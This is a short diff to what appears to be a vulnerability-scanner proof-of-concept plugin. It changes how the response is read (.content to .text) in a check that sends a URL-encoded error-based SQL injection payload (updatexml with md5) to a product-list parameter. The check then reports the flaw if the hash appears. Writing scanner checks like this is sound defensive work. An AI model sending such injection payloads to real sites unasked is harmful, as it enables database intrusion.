@@ -50,7 +50,7 @@ class Poc(ABPoc):
             payload = ("/?m=product&s=list&ptype=0%27%20and%201%3Dupdatexml%281%2Cconcat%280x5c%2Cmd5"
                        "%28222222%29%29%2C1%29%23")
             verify_url = url + payload
-            content = requests.get(verify_url).content
+            content = requests.get(verify_url).text
             if 'e3ceb5881a0a1fdaad01296d7554868d' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
